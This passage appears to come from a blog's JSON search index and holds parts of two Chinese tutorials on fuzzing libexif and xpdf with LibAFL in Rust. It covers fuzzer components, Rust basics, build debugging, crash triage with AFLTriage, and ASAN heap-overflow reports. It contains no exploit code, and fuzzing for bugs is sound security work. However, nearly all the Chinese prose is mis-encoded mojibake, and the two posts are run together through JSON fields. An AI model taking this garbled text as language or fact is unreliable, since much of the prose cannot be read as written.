ç”±äºæˆ‘ä»¬ä½¿ç”¨çš„ä¸å†æ˜¯afl-clang-fastï¼Œè€Œæ˜¯ä½¿ç”¨è‡ªå·±çš„ç¼–è¯‘å™¨wrapperã€‚æ•…__AFL_SHM_IDå·²ç»ä¸å¥½ä½¿äº†ã€‚å¥½åœ¨libafl_targetsæä¾›äº†EDGES_MAPï¼šstd_edges_map_observerã€‚\n1 2 let edges_observer = HitcountsMapObserver::new(unsafe{std_edges_map_observer(\u0026#34;edges\u0026#34;)}); æ­¤å¤–ï¼Œç®€å•çš„è¶…æ—¶åé¦ˆä¹Ÿæ”¹ä¸ºäº†çœŸæ­£çš„å´©æºƒåé¦ˆï¼šCrashFeedbackã€‚\n1 2 let mut objective = feedback_and_fast!(CrashFeedback::new(), MaxMapFeedback::new(\u0026amp;edges_observer)); ç»„ä»¶ï¼šMonitor \u0026amp; EventManager \u0026amp; Status EventManager åœ¨ Inprocess æ¨¡å¼ä¸­æ‰çœŸæ­£å‘æŒ¥åŠŸç”¨ã€‚å¯¹äºå¤šå®ä¾‹ç¯å¢ƒï¼Œé€šä¿¡é—®é¢˜å¿…é¡»è§£å†³ã€‚LibAFLè®¾è®¡äº†ä¸€å¥—ä½çº§æ¶ˆæ¯ä¼ é€’åè®®(LLMP)ï¼Œä½¿ç”¨C-Sæ¶æ„ï¼Œç¬¬ä¸€ä¸ªæ‰§è¡Œçš„fuzzerä½œä¸ºä»£ç†(Broker)ï¼Œåç»­æ‰§è¡Œçš„å‡ä½œä¸ºå®¢æˆ·ç«¯(Client)ã€‚Clientè´Ÿè´£ä¸æ–­æ‰§è¡Œï¼Œå°†ä¿¡æ¯æ±‡æ€»ä¸Brokerç»¼åˆå±•ç¤ºã€‚\næ­¤å¤–ï¼Œ Inprocess æ¨¡å¼è¿˜å¿…é¡»è®¾å®šè¿›ç¨‹çš„é‡å¯ï¼Œsetup_restarting_mgr_stdç¬¬ä¸€æ¬¡æ‰§è¡Œä¸­è¿”å›(None, LlmpRestartingEventManager)ï¼Œåç»­åˆ™è¿”å›ä¸Šä¸€ä¸ªè¿›ç¨‹ç•™ä¸‹çš„çŠ¶æ€ï¼Œä»¥æ­¤å®ç°çŠ¶æ€çš„æ°¸ç»­ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 let monitor = MultiMonitor::new(|s| { println!(\u0026#34;{}\u0026#34;, s); }); // MultiMonitor: åŒæ—¶æ”¯æŒBrokeræ¨¡å¼æˆ–Clientæ¨¡å¼ let (state, mut mgr) = match setup_restarting_mgr_std(monitor, 1337, EventConfig::AlwaysUnique){ Ok(res) =\u0026gt; res, Err(err) =\u0026gt; match err { Error::ShuttingDown =\u0026gt; { return Ok(()); } _ =\u0026gt; { panic!(\u0026#34;Failed to setup the restarting manager: {}\u0026#34;, err); } }, }; let mut state = state.unwrap_or_else(|| { StdState::new( StdRand::with_seed(current_nanos()), input_corpus, solutions_corpus, \u0026amp;mut feedback, \u0026amp;mut objective, ).unwrap() }); Rust åŸºç¡€ä¹‹å‡½æ•°è¿”å›å€¼ã€æ¨¡å¼åŒ¹é…ä¸é”™è¯¯å¤„ç† æœ¬ä¾‹ä¸­çš„mgræ˜¯ä¸€ä¸ªç»å…¸çš„matchç”¨æ³•ï¼Œç”¨matchå¤„ç†å‡½æ•°çš„è¿”å›å€¼ã€‚ä¸‹é¢æŠŠæ¦‚å¿µå’Œç¬¦å·æ‹ä¸€éï¼š\nå‡½æ•° Rust çš„å‡½æ•°ä½“ç”±ä¸€ç³»åˆ—è¯­å¥ç»„æˆï¼Œæœ€åç”±è¡¨è¾¾å¼ç»“å°¾ã€‚å¿…é¡»ä¸¥æ ¼åˆ†åˆ«è¡¨è¾¾å¼å’Œè¯­å¥ã€‚å› ä¸ºè¡¨è¾¾å¼ä»£è¡¨ä¸€ä¸ªè¿”å›å€¼ï¼Œè€Œè¯­å¥ä¸è¿”å›ã€‚\n1 2 3 4 fn FUNC(PARAM: TYPE, PARAM: TYPE, ...) -\u0026gt; RETURN_TYPE { STATEMANT; EXPRESSION } ;: æ ‡è¯†ä¸€æ¡è¯­å¥ã€‚è¡¨è¾¾å¼æ²¡æœ‰åˆ†å·ã€‚ !: æ ‡è¯†å‘æ•£å‡½æ•°(diverge function)ï¼Œæ²¡æœ‰è¿”å›å€¼ã€‚å¦‚println!(\u0026quot;{}\u0026quot;, s)ï¼Œpanic!() panic!(): çº¿ç¨‹ææ…Œã€‚å•çº¿ç¨‹ç¨‹åºå³æŠ¥é”™é€€å‡ºã€‚ (): ç©ºå…ƒç»„ï¼Œä¸å ç”¨å†…å­˜ã€‚æ— è¿”å›å€¼æ—¶çš„è¿”å›å€¼ã€‚ æ¨¡å¼åŒ¹é… matchç›¸å½“äºswitchçš„åŠ å¼ºç‰ˆï¼š\n1 2 3 4 5 match VALUE { PATTERN =\u0026gt; EXPRESSION, PATTERN =\u0026gt; EXPRESSION, ... } _: è¡¨ç¤ºå‰©ä½™æƒ…å†µçš„PATTERNã€‚ exhaustiveç‰¹æ€§ï¼šå˜é‡çš„æ‰€æœ‰å¯èƒ½æ€§å¿…é¡»å…¨éƒ¨è¢«è¦†ç›–ã€‚ é”™è¯¯å¤„ç† å‡½æ•°è¿”å›å€¼å¸¸ç”¨ä¸¤ç±»æ³›å‹æšä¸¾è¿›è¡ŒåŒ…è£…ï¼š\n1 2 3 4 5 6 7 8 pub enum Option\u0026lt;T\u0026gt; { // å¯é€‰å€¼ None, // å¯ä»¥æ²¡æœ‰å€¼ã€‚é€‚ç”¨äºè®¸å¤šæƒ…å†µï¼šåˆå§‹å€¼ï¼Œå¯é€‰å‚æ•°ï¼Œé”™è¯¯(ä¸ä¼španic!) Some(T), // å¿…é¡»æœ‰å€¼ } enum Result\u0026lt;T, E\u0026gt; { // è¿”å›å€¼ Ok(T), Err(E), // Errå¯ä»¥ä¸panic! } Rustå¯¹Resultå®ç°äº†è®¸å¤šæ–¹ä¾¿çš„æ–¹æ³•ï¼Œè¯¦æƒ…è¯·å‚é˜…æ–‡æ¡£ã€‚\nunwrap()ï¼šè§£åŒ…Resultï¼Œæ‰èƒ½è·å–å€¼ å¯¹Noneæ‰§è¡Œåˆ™panic! ?ï¼šè¯­æ³•ç³–ï¼Œå°†Errå¯¹è±¡ä¼ æ’­å‡ºæ¥ï¼Œè¿›ä¸€æ­¥ä½¿ä»£ç ç®€æ´ã€‚ 1 2 3 4 5 let result = match FUNC() { Err(e) =\u0026gt; return Err(e), Ok(f) =\u0026gt; f, }; let result = FUNC()?; //ç­‰ä»·å†™æ³• å‚è€ƒæ–‡æ¡£ï¼š\nhttps://rustwiki.org/zh-CN/std/option/index.html https://rustwiki.org/zh-CN/std/result/index.html ç»„ä»¶ï¼šHarness \u0026amp; Executor åœ¨fuzzerä¾§ï¼ŒLLVMFuzzerTestOneInput()å¯¹åº”libfuzzer_test_one_input()å‡½æ•°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 let mut harness = |input: \u0026amp;BytesInput| { let target = input.target_bytes(); let buffer = target.as_slice(); libfuzzer_test_one_input(buffer); ExitKind::Ok }; let in_proc_executor = InProcessExecutor::new( \u0026amp;mut harness, tuple_list!(edges_observer, time_observer), \u0026amp;mut fuzzer, \u0026amp;mut state, \u0026amp;mut mgr, ).unwrap(); fuzzerå†™å®Œäº†ï¼Œå–„ï¼\nRust åŸºç¡€ä¹‹é—­åŒ… é—­åŒ…(closure)ï¼Œä¸€èˆ¬è¯­è¨€çš„é—­åŒ…å°±æ˜¯ lambda è¡¨è¾¾å¼æˆ–åŒ¿åå‡½æ•°ï¼Œåœ¨Rustä¸­è¿˜è¦åŠ ä¸Šæ•è·å¤–éƒ¨ç¯å¢ƒä¸­çš„å˜é‡çš„èƒ½åŠ›ã€‚\né—­åŒ…æ•è·å˜é‡çš„æ–¹å¼åˆ†ä¸ºä¸‰ç±»ï¼šæŒ‰é¡ºåºæ•è·\nFnï¼šè¡¨ç¤ºæ•è·æ–¹å¼ä¸ºé€šè¿‡ä¸å¯å˜å¼•ç”¨ï¼ˆ\u0026amp;Tï¼‰çš„é—­åŒ… FnMutï¼šè¡¨ç¤ºæ•è·æ–¹å¼ä¸ºé€šè¿‡å¯å˜å¼•ç”¨ï¼ˆ\u0026amp;mut Tï¼‰çš„é—­åŒ… FnOnceï¼šè¡¨ç¤ºæ•è·æ–¹å¼ä¸ºé€šè¿‡å€¼ï¼ˆTï¼‰çš„é—­åŒ… å®é™…ä¸Šï¼Œé—­åŒ…å°±æ˜¯è¿™ä¸‰ç§Traitçš„è¯­æ³•ç³–ã€‚å…³äºTraitç›®å‰å¤§è‡´ç†è§£æˆæŸç§è§„å®šæ³›å‹å¯¹è±¡çš„è¡Œä¸ºçš„ä¸œè¥¿ã€‚å¦‚ä¸Šé¢çš„ä¸‰ç±»å‡½æ•°ï¼Œä¸åŒç¨‹åº¦ä¸Šçº¦æŸäº†æ³›å‹ã€‚æ·±åº¦å†…å®¹ç•™å¾…åæ–‡å­¦ä¹ ã€‚\nç©¶ç«Ÿä½•ä¸ºâ€œæ•è·â€ï¼ŸRustæ˜¯æ²¡æœ‰åƒåœ¾å›æ”¶çš„è¯­è¨€ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯ç”Ÿå‘½å‘¨æœŸã€‚å¼•ç”¨æ—¶ï¼Œä¼šè‡ªåŠ¨åˆ†æå˜é‡ç”Ÿå‘½å‘¨æœŸï¼Œä»¥å†³å®šä½¿ç”¨å“ªä¸ªTraitã€‚\nè¿˜å¯ä»¥ä½¿ç”¨å…³é”®å­—moveå¼ºåˆ¶è½¬ç§»æ‰€æœ‰æƒåˆ°é—­åŒ…ä¸­\nå‚è€ƒæ–‡æ¡£ï¼šhttps://rustwiki.org/zh-CN/rust-by-example/fn/closures/capture.html\nè·‘ğŸƒâ€ ä½¿ç”¨ASANå¾ˆå¿«å°±å‘ç°äº†å´©æºƒï¼š\n1 2 3 4 5 6 7 8 [AFL++ ae703a5ce157] /fuzzing101/exercise-2 # taskset -c 4 ./build/fuzzer [Broker #0] (GLOBAL) run time: 0h-0m-57s, clients: 0, corpus: 0, objectives: 0, executions: 0, exec/sec: 0.000 (CLIENT) corpus: 0, objectives: 0, executions: 0, exec/sec: 0.000 -------------8\u0026lt;------------- [Stats #3] (GLOBAL) run time: 0h-1m-0s, clients: 4, corpus: 3, objectives: 0, executions: 6, exec/sec: 0.000 (CLIENT) corpus: 3, objectives: 0, executions: 6, exec/sec: 0.000, edges: 9/10 (90%) [Testcase #3] (GLOBAL) run time: 0h-1m-0s, clients: 4, corpus: 4, objectives: 0, executions: 8, exec/sec: 0.000 (CLIENT) corpus: 4, objectives: 0, executions: 8, exec/sec: 0.000, edges: 9/10 (90%) Debugï¼šæˆ‘logå»å“ªäº† ä½†ç»“æœå¹¶ä¸è®©äººæ»¡æ„ï¼Œèµ·å› æ˜¯cargo make buildæ‰§è¡Œå¹¶æœªæˆåŠŸï¼Œä¸Šè¿°ç»“æœæ˜¯æ‰‹åŠ¨ç¼–è¯‘å¾—åˆ°ã€‚æŠ¥é”™å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 [cargo-make] INFO - Running Task: build-libexif -------------8\u0026lt;------------- checking for a BSD-compatible install... /usr/bin/install -c checking whether build environment is sane... yes checking for a race-free mkdir -p... /usr/bin/mkdir -p checking for gawk... no checking for mawk... mawk checking whether make sets $(MAKE)... yes checking whether make supports nested variables... yes checking for POSIX sh $() command substitution... yes checking for gcc... /fuzzing101/exercise-2/build/ex2_compiler checking whether the C compiler works... no configure: error: in `/fuzzing101/exercise-2/libexif\u0026#39;: configure: error: C compiler cannot create executables See `config.log\u0026#39; for more details [cargo-make] ERROR - Error while executing command, exit code: 77 [cargo-make] WARN - Build Failed. å®ƒæç¤ºæˆ‘ï¼Œæˆ‘çš„ç¼–è¯‘å™¨ä¸å¤§å¥½ä½¿ã€‚ä½†æ˜¯è¾ƒä¸ºç¦»è°±çš„æ˜¯æ‰‹åŠ¨æ‰§è¡Œç¼–è¯‘å´æ²¡é—®é¢˜ã€‚ é‚£ä¹ˆæˆ‘ä»¬çœ‹çœ‹config.logå§ï¼Œç„¶åå°±æœ‰ä¸ªé—®é¢˜ï¼Œconfig.logåˆ°åº•è—å“ªäº†ã€‚\nğŸ‘´ï¼šä½ æ ¹æœ¬ä¸åœ¨å·¥ä½œç›®å½•ï¼Œä½ èº²å“ªå»äº† cargo make: æˆ‘ä¸åˆ°å•Š\nè¿™ä¸ªå¹½çµé—®é¢˜æŠ˜ç£¨äº†æˆ‘è®¸ä¹…ï¼Œç›´åˆ°æˆ‘æ„è¯†åˆ°Makefile.tomlé‡Œé¢çš„cleané€‰é¡¹ã€‚ã€‚ã€‚\n1 2 3 4 5 ... rest of stderr output deleted ... configure:3778: $? = 0 configure:3767: /fuzzing101/exercise-2/build/ex2_compiler -V \u0026gt;\u0026amp;5 clang: error: unsupported option \u0026#39;-V -g\u0026#39; clang: error: no such file or directory: \u0026#39;/fuzzing101/exercise-2/libexif/libexercisetwo.a\u0026#39; è™½ç„¶è¿˜æ˜¯ä¸ç†è§£ä¸ºä»€ä¹ˆï¼Œä½†æ˜¯ç…§çŒ«ç”»è™æŠŠlibexercisetwo.aæ”¾å…¥å°±ç¼–è¯‘æˆåŠŸäº†ã€‚\nDebugï¼šå†…å­˜çˆ†äº†ï¼ å°½ç®¡å¾ˆå¿«è·‘å‡ºcrashï¼Œä½†fuzzerç»å¸¸å´©æºƒé€€å‡ºï¼Œå¯¼è‡´å¹¶æ²¡æœ‰crashä¿å­˜ã€‚æŠ¥é”™å¦‚ä¸‹ï¼š\n1 2 3 4 thread \u0026#39;\u0026lt;unnamed\u0026gt;\u0026#39; panicked at \u0026#39;Fuzzer-respawner: Storing state in crashed fuzzer instance did not work, no point to spawn the next client! This can happen if the child calls `exit()`, in that case make sure it uses `abort()`, if it got killed unrecoverable (OOM), or if there is a bug in the fuzzer itself. (Child exited with: 9)\u0026#39;, /root/.cargo/registry/src/index.crates.io-6f17d22bba15001f/libafl-0.10.1/src/events/llmp.rs:1071:21 note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace fatal runtime error: failed to initiate panic, error 5 Aborted æŠ¥é”™å‘Šè¯‰æˆ‘ä»¬å¯èƒ½æœ‰ä»¥ä¸‹åŸå› ï¼š\nchild calls exit()ï¼šæˆ‘è·‘çš„ç¡®å®æ˜¯ASAN_OPTIONS=abort_on_error=1 taskset -c 6 ./build/fuzzer fuzzeræœ‰bugï¼šæˆ‘å¯ä»¥ä¸ç›¸ä¿¡æˆ‘è‡ªå·±ï¼Œä½†æˆ‘ä¸èƒ½ä¸ç›¸ä¿¡ Rustã€‚ OOMï¼šå†…å­˜æº¢å‡ºã€‚è§‚å¯Ÿä¸‹ä»»åŠ¡ç®¡ç†å™¨ï¼Œå¯ä»¥å‘ç°fuzzeræ‰§è¡Œåå†…å­˜å ç”¨è¿…é€Ÿé£™å‡ï¼Œåœ¨è¾¾åˆ°90%åfuzzerç¨³å®šå´©æºƒé€€å‡ºã€‚ é‚£ä¹ˆåŸºæœ¬ç¡®è®¤æ˜¯å†…å­˜æº¢å‡ºçš„é—®é¢˜ã€‚ğŸ‘´çš„16Gå±å®ä¸å ªå¤§ç”¨ï¼Œè¿™ä¸‹ä¸å¾—ä¸ä¹°å†…å­˜æ¡äº†ã€‚\né‚£ä¹ˆåŸºæœ¬ç¡®è®¤é—®é¢˜æ— è§£äº†å—ï¼ŸğŸ‘´å¼€å§‹æ€€ç–‘é—®é¢˜å‡ºåœ¨Dockerä¸Šã€‚äºæ˜¯ğŸ‘´å›åˆ°å®¿ä¸»æœº WSL2 ä¸Šé‡æ–°é…ç¯å¢ƒã€‚è¿˜æ˜¯åœ¨æ‰§è¡Œcp build/libexercisetwo.a libexifä¹‹åæˆåŠŸç¼–è¯‘ã€‚\nè¿™æ¬¡èƒ½å¤Ÿç¨³å®šè¿è¡Œä¸€æ®µæ—¶é—´äº†ï¼Œå¹¶ä¸”æˆåŠŸè·å¾—objectiveã€‚ğŸ‘´å°±æ˜¯ä¸ªç¿æ™ºã€‚\nğŸ‘´å®£å¸ƒå®éªŒ2å®Œæˆã€‚\næˆæœè½åœ° å¥½å§è¿˜æœ‰æœ€åä¸€æ­¥ã€‚åœ¨è¯¸å¤šcrashä¸­å¯èƒ½æœ‰å¤§é‡å‡é˜³æ€§ï¼Œå¤§é‡é‡å¤æ¼æ´ï¼Œä¸ºäº†è·å¾—æœ€ç»ˆçš„CVEç¼–å·ï¼Œè¿˜éœ€è¦è´¹æ—¶è´¹åŠ›çš„è¾¨åˆ«ã€‚AFLTriage å°±æ˜¯è§£å†³è¿™ä¸ªé—®é¢˜çš„è‡ªåŠ¨åŒ–å·¥å…·ï¼Œå®ƒä½¿ç”¨ GDB å¹¶è¡Œçš„æ‰§è¡Œæ¼æ´åˆ†ç±»ã€ ASAN è§£æå’Œ crash å»é‡ç­‰å·¥ä½œã€‚\nAFLTriage çš„å·¥ä½œæµç¨‹ååˆ†ç®€å•ï¼šå°†crashä¾æ¬¡ä¸¢è¿›targetæ‰§è¡Œï¼Œå¹¶è§£è¯»æ‰§è¡ŒæŠ¥å‘Šã€‚ å› æ­¤ï¼Œé¦–å…ˆè¦ä¸ºharnessæ·»åŠ ä¸€ä¸ªmainå‡½æ•°ï¼Œä½¿å…¶è°ƒç”¨ä¸€æ¬¡LLVMFuzzerTestOneInput()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // harness.c #ifdef TRIAGE_TESTER int main(int argc, char* argv[]) { struct stat st; char *filename = argv[1]; stat(filename, \u0026amp;st); FILE *fd = fopen(filename, \u0026#34;rb\u0026#34;); char *buffer = (char *)malloc(sizeof(char) * (st.st_size)); fread(buffer, sizeof(char), st.st_size, fd); LLVMFuzzerTestOneInput(buffer, st.st_size); free(buffer); fclose(fd); } #endif è¿™é‡Œé€šè¿‡#ifdefå®æŒ‡ä»¤å’Œbuildé€‰é¡¹å¯¹åº”ï¼Œæ‰§è¡Œcargo make build-triagerå³å¯è¿›å…¥åˆ†ç±»æµç¨‹ã€‚\n1 2 3 4 [tasks.build-triager] cwd = \u0026#34;build\u0026#34; command = \u0026#34;./ex2_compiler\u0026#34; args = [\u0026#34;-D\u0026#34;, \u0026#34;TRIAGE_TESTER\u0026#34;, \u0026#34;-I\u0026#34;, \u0026#34;../libexif/libexif\u0026#34;, \u0026#34;-I\u0026#34;, \u0026#34;../libexif\u0026#34;, \u0026#34;-o\u0026#34;, \u0026#34;triager\u0026#34;, \u0026#34;../harness.c\u0026#34;, \u0026#34;lib/libexif.a\u0026#34;] æœ€åæ‰§è¡ŒAFLTriageï¼š../AFLTriage/target/release/afltriage -i ./solutions/ -o ./reports/ ./build/triager @@\nå¾—åˆ°3ä¸ªreportï¼š\n1 2 3 afltriage_ASAN_heap-buffer-overflow_READ_exif_entry_get_value_f8a5a368646cf8484298dd0549da6e12.txt afltriage_ASAN_unknown-crash_WRITE_exif_mnote_data_olympus_save_1e4a69a1a4d7585d8ae1e143a3b5eb94.txt afltriage_SIGSEGV___memmove_sse2_unaligned_erms_b1cfe4f5c38c4991e7c55dccdfb06372.txt ğŸ‘´è¿˜æœ‰ç‚¹æ€€ç–‘ASANçš„è¾“å‡ºå¥½åƒéƒ½æ˜¯fuzzeré‡Œé¢çš„bugï¼Œä½†æ˜¯é˜…è¯»æŠ¥å‘Šä¹‹åå‘ç°ç¡®å®æ˜¯targeté‡Œé¢çš„ã€‚åªæ˜¯åŸåšå®¢çš„ASANèƒ½å¤ŸæŒ‡å‡ºTargetæºä»£ç çš„è¡Œå·ï¼ŒğŸ‘´çš„åªèƒ½æ‹¿åˆ°äºŒè¿›åˆ¶åœ°å€ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 Summary: ASAN detected heap-buffer-overflow in exif_entry_get_value after a READ leading to SIGABRT (si_signo=6) / SI_TKILL (si_code=-6) -------------8\u0026lt;------------- #10 0x0000555555695c85 in exif_entry_get_value (/home/czy/fuzzing-101-solutions/exercise-2/build/triager) 542: const exif_entry_get_value(e = (ExifEntry *)0x604000000350, val = (char *)\u0026lt;optimized out\u0026gt;, maxlen = (unsigned int)1999) { |||: |||: /* Local reference: ExifEntry * e = 0x604000000350; */ 682: */ 683: if (e-\u0026gt;size \u0026amp;\u0026amp; e-\u0026gt;data \u0026amp;\u0026amp; 684: (strspn ((char *)e-\u0026gt;data, \u0026#34; \u0026#34;) != strlen ((char *) e-\u0026gt;data))) |||: ---: } at exif-entry.c:684 åªèƒ½è¯´ğŸ‘´çš„ç¯å¢ƒè¿˜æ˜¯æœ‰ç‚¹æ¯›ç—…ï¼Œ WSL2 é‡Œé¢è·‘æ¯” WSL2+Docker é‡Œé¢è·‘ï¼Œç¨³å®šè¿è¡Œæ—¶é—´é•¿ï¼Œä½†ä¹Ÿä¸è¶…è¿‡ä¸‰åˆ†é’Ÿã€‚ğŸ‘´åªèƒ½æ‰‹åŠ¨æ–­æ–­ç»­ç»­çš„é‡æ–°è·‘ï¼Œè¿™æ ·fuzzerçš„çŠ¶æ€å…¶å®æ˜¯ä¸¢å¤±äº†çš„ã€‚åé¢çš„å®éªŒè¿˜æ˜¯åˆ«æŠ˜è…¾æˆ‘è¿™ä¸ªç ´æœ¬å­äº†ã€‚\nè€Œä¸”è·‘å‡ºæ¥çš„crashğŸ‘´çœ‹ç€ä¹Ÿä¸åƒé¢„æœŸè¦æŒ–çš„é‚£ä¿©CVEã€‚ä½†æ˜¯è¿™äº›éƒ½ä¸å½±å“ğŸ‘´å†æ¬¡å®£å¸ƒå®éªŒ2å®Œæˆã€‚\n","date":"2023-07-30T02:45:31+08:00","image":"https://lonelyuan.github.io/p/libafl%E9%80%9F%E9%80%9Afuzzing101-2/final_hu189931506a8648410d5552fb49660c91_955953_120x120_fill_box_smart1_3.png","permalink":"https://lonelyuan.github.io/p/libafl%E9%80%9F%E9%80%9Afuzzing101-2/","title":"libAFLé€Ÿé€šFuzzing101 (2)"},{"content":" æœ¬ç³»åˆ—æ˜¯å­¦ä¹ ã€ŠFuzzing101 with LibAFLã€‹ç³»åˆ—åšå®¢ï¼ˆåæ–‡ç»Ÿç§°ï¼šåŸåšå®¢ï¼‰çš„ç¬”è®°åˆ†äº«ï¼Œåœ¨å­¦ä¹ ä»‹ç» LibAFL ç”¨æ³•çš„åŒæ—¶æ€»ç»“ Rust çŸ¥è¯†ç‚¹ã€‚\nå‰ç½®çŸ¥è¯†ï¼š fuzzåŸºæœ¬æ¦‚å¿µã€AFLåŸºæœ¬ä½¿ç”¨ æœ¬ç¯‡è¦ç‚¹ï¼š\nLibAFL 9å¤§ç»„ä»¶ Forkserveræ¨¡å¼ï¼šç®€å•ç»„è£… Rust Cargo åŸºæœ¬ä½¿ç”¨ å˜é‡æ‰€æœ‰æƒï¼š è½¬ç§»(move) å’Œ æ‹·è´(copy) å¼•ç”¨(reference) å’Œ å€Ÿç”¨(borrowing) æ˜¯ä¸æ˜¯æfuzzçš„éƒ½åœ¨ærust Fuzzing101æ˜¯å¤§åé¼é¼çš„ Fuzzing å…¥é—¨æ•™ç¨‹ã€‚ğŸ‘´ä¹‹å‰æè¿‡ä¸€ç‚¹ï¼Œæ•…è¿™æ¬¡æ•´ç‚¹èŠ±æ´»ã€‚çœ‹åˆ°æœ‰ä¸ªå«epi052çš„å¤§ä½¬ç”¨ LibAFL åš Fuzzing101ï¼Œäºæ˜¯ğŸ‘´ä¹Ÿè·Ÿç€å­¦ä¸€æ³¢rustã€‚\nLibAFLæ˜¯ç”¨ Rust å†™çš„ Fuzzing æ¡†æ¶ï¼Œä¸»è¦è´¡çŒ®åœ¨äºç»™å‡ºäº†ä¸€å¥— Fuzzer çš„æ ‡å‡†åŒ–å®šä¹‰ï¼Œä»¥æ­¤è¯•å›¾æ”¹å–„å½“ä»Š Fuzzing ç ”ç©¶ç•Œæˆæœå€å‡ºä½†äº’ä¸å…¼å®¹ï¼Œç»å¸¸é‡å¤é€ è½®å­çš„ç°è±¡ã€‚\nLibAFL éš¶å±äº AFL++ é¡¹ç›®ç»„ï¼Œæ•…éœ€è¦å…ˆé…ç½® AFL++ ã€‚è€Œ AFL++ çš„å®˜æ–¹ Docker é•œåƒå°±åŒ…å«äº† Rust ç¯å¢ƒï¼Œæ‰€ä»¥ä½¿ç”¨ Docker é… LibAFL ç¯å¢ƒå°±åªéœ€ä¸€å¥è¯ï¼š\n1 2 docker pull aflplusplus/aflplusplus docker run -ti -v ./Fuzzing101:/fuzzing101 aflplusplus/aflplusplus Execise-1 xpdf ç»ƒä¹ ä¸€ä¸»è¦æ˜¯ç†Ÿæ‚‰åŸºæœ¬æµç¨‹ã€‚ä½¿ç”¨AFLä¸»è¦æœ‰ä»¥ä¸‹æ­¥éª¤ï¼š\nç›®æ ‡ç¼–è¯‘æ’æ¡©ã€‚å¦‚ï¼š 1 2 3 4 export LLVM_CONFIG=llvm-config-15 CC=afl-clang-fast CXX=afl-clang-fast++ ./configure --prefix=./install make make install è¯­æ–™åº“å‡†å¤‡ æ‰§è¡Œafl-fuzz Let\u0026rsquo;s see å¦‚ä½•ç”¨Rustå®Œæˆä¸Šè¿°æ­¥éª¤ã€‚\nRust åŸºç¡€ä¹‹cargo åœ¨ Rust ä¸­ï¼Œå¯ä»¥ç”¨rustcç¼–è¯‘å•ä¸ªæ–‡ä»¶ï¼Œæ›´å¸¸è§çš„æ˜¯ä½¿ç”¨åŒ…ç®¡ç†å™¨cargoã€‚\nCargo.toml è¿è¡Œcargo newåˆ›å»ºä¸€ä¸ª package ï¼Œå…¶ä¸­å¿…æœ‰Cargo.tomlï¼Œæè¿° package å¦‚ä½•æ„å»ºã€‚\n1 2 3 4 5 6 7 8 9 # execise-1/Cargo.toml [package] name = \u0026#34;exercise-1\u0026#34; version = \u0026#34;0.1.0\u0026#34; edition = \u0026#34;2021\u0026#34; build = \u0026#34;build.rs\u0026#34; [dependencies] libafl = \u0026#34;0.10.1\u0026#34; æœ¬é¡¹ç›®é¦–å…ˆè§„å®šäº†æ„å»ºè„šæœ¬ä¸ºbuild.rsï¼Œç„¶åå¼•å…¥äº† libafl ä¾èµ–ã€‚ è¿è¡Œcargo buildæ—¶ï¼ŒCargo ä¼šè‡ªåŠ¨å¤„ç†ä¾èµ–ã€‚(åŒ…æ‹¬ crates.io ä¸‹è½½å®‰è£…ï¼Œæˆ‘è§‰å¾—è¿™å°±æ˜¯ç°ä»£è¯­è¨€çš„ä¸€ç§è‡ªä¿¡)\nbuild.rs æ„å»ºè„šæœ¬æ˜¯ä¸ºäº†æ–¹ä¾¿ Rust é¡¹ç›®ä¸ç¬¬ä¸‰æ–¹å·¥å…·çš„é›†æˆã€‚æ¯”å¦‚ä¸Šæ–‡ä¸­ç›®æ ‡ç¼–è¯‘çš„å‡ æ¡æŒ‡ä»¤ï¼Œå°±å¯ä»¥ç”¨ Rust std åº“ä¸­çš„Commandç±»æ¥æ‰§è¡Œã€‚\n1 2 3 4 5 6 // make clean; Command::new(\u0026#34;make\u0026#34;) .arg(\u0026#34;clean\u0026#34;) .current_dir(xpdf_dir.clone()) .status() .expect(\u0026#34;Couldn\u0026#39;t clean xpdf directory\u0026#34;); ä½¿ç”¨æ„å»ºè„šæœ¬è¿˜æœ‰è®¸å¤šå¥½å¤„ï¼Œå¯ä»¥åˆ©ç”¨ Cargo é‡‡å–æ›´çµæ´»çš„æ„å»ºç­–ç•¥ã€‚æ„å»ºè„šæœ¬çš„è¾“å‡ºå¯ä»¥è¢« Cargo è§£é‡Šï¼Œåªéœ€æ‰“å°ä»¥cargo: å¼€å¤´çš„æŒ‡ä»¤ã€‚å¦‚ä¸‹é¢ä¸¤è¡Œè¾“å‡ºå‘ Cargo è¡¨æ˜ä»…åœ¨è¿™ä¸¤ä¸ªæ–‡ä»¶å‘ç”Ÿæ”¹åŠ¨æ—¶æ‰§è¡Œæ„å»ºè„šæœ¬ã€‚\n1 2 println!(\u0026#34;cargo:rerun-if-changed=build.rs\u0026#34;); println!(\u0026#34;cargo:rerun-if-changed=src/main.rs\u0026#34;); LibAFL ç»„è£… ä¸Šè¿°è¿˜æ˜¯ç”œç‚¹ï¼Œä¸‹é¢è¿›å…¥æ­£èœç¯èŠ‚ã€‚ LibAFL å°† Fuzzer å®šä¹‰ä¸º9ä¸ªç»„ä»¶ï¼Œåˆ†åˆ«æ˜¯ï¼š\næ‘˜è‡ªè¿™ç¯‡åšå®¢ã€‚\nInputï¼šç¨‹åºçš„è¾“å…¥ã€‚ é‡ç‚¹æ˜¯æ ¼å¼ï¼Œæœ€å¸¸è§çš„å°±æ˜¯ byte arrayï¼Œä¹Ÿæœ‰ASTç­‰ã€‚ Corpusï¼šè¾“å…¥å’Œå…¶é™„å±å…ƒæ•°æ®çš„å­˜å‚¨ã€‚ å­˜å‚¨æœ‰ä½äºå†…å­˜å’Œä½äºç¡¬ç›˜ä¸¤ç§ï¼Œåè€…æ›´å¹¿æ³›ã€‚è¾“å…¥ä¹Ÿå¯åˆ†ä¸ºæœ‰åŠ©äºè¿›åŒ–çš„ interesting testcase å’Œæœ€ç»ˆè§¦å‘ crash çš„ solutionã€‚ Schedulerï¼šä» corpus ä¸­é€‰å– testcase çš„è°ƒåº¦ç­–ç•¥ã€‚ æœ€æœ´ç´ çš„å³å…ˆè¿›å…ˆå‡ºæˆ–éšæœºé€‰æ‹©ï¼Œä¹Ÿå¯å¼•å…¥ä¼˜å…ˆçº§ç®—æ³•ã€‚ Stageï¼šå®šä¹‰å¯¹ testcase è¿›è¡Œçš„æ“ä½œï¼ˆactionï¼‰ã€‚ 